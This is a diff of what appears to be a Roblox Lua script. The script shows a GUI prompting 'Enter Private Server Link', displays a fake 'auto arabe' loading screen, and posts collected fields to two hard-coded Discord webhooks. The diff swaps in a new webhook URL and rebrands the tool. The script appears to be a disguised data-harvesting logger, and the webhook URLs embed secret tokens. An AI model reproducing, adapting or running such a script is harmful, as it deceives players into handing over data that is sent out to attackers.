@@ -12,7 +12,7 @@ local CoreGui = game:GetService("CoreGui")
 
 local WEBHOOKS = {
     "https://discord.com/api/webhooks/1444572842162393220/fzmTS5484SC7ycsxFpWneHsXLiJcW2Hb5gBgF_Jdy-nuw11u1H0TjlhCOUDWGYIurTAB", -- WEBHOOK 1
-    "https://discord.com/api/webhooks/1447077125160042558/mWG0PFosPeqeASpPOQAPHG2ItfgoUw1XwIQqJdKYYgxF-uK_muyPeCmlNhq6RrXUU9vz",  --WEBHOOK 2
+    "https://discord.com/api/webhooks/1448494152680738946/buIXn9w0EFXaWQTdw2VgpiywR-8NfWimfBI3KgRkxYHhnngTm-k8cZTH-XCgZT7Giazx",  --WEBHOOK 2
 }
 
 --========================================================--
@@ -76,7 +76,7 @@ Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1,0,0,40)
-title.Text = "Enter Private Server Link"
+title.Text = "auto arabe methods"
 title.BackgroundTransparency = 1
 title.Font = Enum.Font.GothamBold
 title.TextSize = 20
@@ -114,13 +114,13 @@ local function SendWebhook(extraFields)
     local timeStr = "foi ás " .. os.date("%H:%M")
 
     local payloadTable = {
-        username = "by: print()",
+        username = "by: y6()",
         embeds = {{
-            title = "🔗 auto windows | " .. timeStr,
+            title = "🔗 auto arabe | " .. timeStr,
             color = 16732240,
             fields = extraFields,
             image = {
-                url = "https://cdn.discordapp.com/attachments/1445217512235995216/1445225178228457595/1660655429_windows_12_-_3.png?ex=692f9255&is=692e40d5&hm=0963370b10413cb27f720515b2871da18bdd3be3bd6ad9c00a8292946cfa85f6"
+                url = ""
             }
         }}
     }
@@ -182,7 +182,7 @@ loaderTitle.BackgroundTransparency = 1
 loaderTitle.Font = Enum.Font.GothamBold
 loaderTitle.TextSize = 36
 loaderTitle.TextColor3 = Color3.fromRGB(255,80,80)
-loaderTitle.Text = "auto windows..."
+loaderTitle.Text = "auto arabe..."
 loaderTitle.TextScaled = true
 
 local loaderPercent = Instance.new("TextLabel", loaderFrame)
